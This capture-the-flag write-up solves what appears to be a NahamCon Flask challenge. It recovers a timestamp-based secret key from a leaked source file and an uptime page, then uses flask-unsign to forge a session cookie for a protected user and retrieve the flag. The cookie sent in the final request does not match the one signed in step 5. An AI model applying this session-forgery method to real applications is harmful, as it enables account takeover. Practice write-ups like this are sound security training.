1. I navigated to `/backup`
```python
---------- command output: {head -n 10 app.py} ----------

from flask import (Flask, flash, redirect, render_template, request, send_from_directory, session, url_for)
from datetime import datetime

app = Flask(__name__)

c = datetime.now()
f = c.strftime("%Y%m%d%H%M")
app.secret_key = f'THE_REYNOLDS_PAMPHLET-{f}'

allowed_users = ['Jefferson', 'Madison', 'Burr'] # No Federalists Allowed!!!!

---------- command output: {head -n 10 requirements.txt} ----------

Flask==3.0.3
```
2. To decode the cookie,
```sh
 python flask-unsign -d -c .eJwNxcENgCAMBdBV6j8zgUcdwxDTYEUTKYaWk3F3fZf3YN0vtkMM4_KA_A9FzDgLAmZWrU5XzacSG029tUCcUu3qdBrdrbokl21AfGOAchGMyF3M8X7pNCAR.ZlGYjw.40gObfG_m0M4RI5tojg-sDw48I4
```
Output:
```
{'_flashes': [('message', 'Cannot login as Burr, account is protected!')], 'name': 'guest'}
```
3. In `/status`,
Output:
```http
HTTP/1.1 200 OK

Server: Werkzeug/3.0.3 Python/3.8.10

Date: Sat, 25 May 2024 07:54:34 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 65

Connection: close



System healthy! Computing uptime...
82817 days 23 hours 9 minutes
```
4. To calculate the date time,
```sh
python -c "import datetime; c = datetime.datetime(2024, 5, 25, 7, 54) - datetime.timedelta(days=82817, hours=23, minutes=9); d = c.strftime('%Y%m%d%H%M'); print(d)"
```
Output:
```
179708250845
```
Thus, Possible secret key:
```
THE_REYNOLDS_PAMPHLET-179708250845
```
5. To generate the cookie,
```sh
python flask-unsign --sign --cookie "{'name': 'Burr'}" --secret 'THE_REYNOLDS_PAMPHLET-179708250845'
```
Output:
```
eyJuYW1lIjoiQnVyciJ9.ZlGcEw.Ivy3OcEmnlYIVoDA7p_phzoh26w
```
6. Now, send a GET request to `/messages`
```http
GET /messages HTTP/1.1

Host: challenge.nahamcon.com:31091

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://challenge.nahamcon.com:31091/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: session=.eJwVyjEKgDAMBdCrxD_3BB31GCISatSCTaWJk3h3dXrLuzGvB9suhjjeIP9AETPeBAEDq1ano25ZiY36q7VAnFK91Ckbna26JJelw_RMAcpFEPE_PC_ILR-E.ZlGcPw.frMoNxoMhejDnE9GBByOv1C2vW0

Connection: close
```
Output:
```http
HTTP/1.1 200 OK

Server: Werkzeug/3.0.3 Python/3.8.10

Date: Sat, 25 May 2024 08:08:30 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 2108

Vary: Cookie

Connection: close



<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>
Congratulations
</title>
    <link rel="stylesheet" href=" /static/css/bootstrap4-executive-suite.min.css">
  </head>
  <body>

  <div class="bg-dark navbar-dark text-white">
    <div class="container">
      <nav class="navbar px-0 navbar-expand-lg navbar-dark">
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
          <div class="navbar-nav">
            <a href="/" class="pl-md-0 p-3 text-white">Start</a>
            <a href="/messages" class="pl-md-0 p-3 text-white">Messages</a>
            <a href="/status" class="pl-md-0 p-3 text-white">Status</a>
            <!-- <a href="/backup" class="pl-md-0 p-3 text-white">Backup</a> !-->
          </div>
        </div>
      </nav>

    </div>
  </div>

  

<div class="jumbotron py-0 bg-light text-dark mb-0 radius-0">
  <div class="container">
    <div class="row">
      <div class="col-xl-5 mr-auto d-none d-xl-block">
        <div class="executive-image">
          <img src="/static/images/executive-image.jpg"
               width="445"
               alt="Rockefeller Building">

        </div>
      </div>
      <div class="col-xl-6 ml-auto jumbo-vertical-center">
        <div>
            <h1>Welcome fellow Democratic Republican!</h1>
            <p>Don't tell Hamilton, but we totally know what he did.</p>
            <strong>flag{HERE_IS_THE_FLAG}</strong>
        </div>
      </div>
    </div>
  </div>
</div>



  <div class="container py-5">
    <strong>Page sourced from:</strong><br>
    <a href="https://github.com/HackerThemes/theme-machine">https://github.com/HackerThemes/theme-machine</a>

</div>
  </body>
</html>
```
- Found the flag!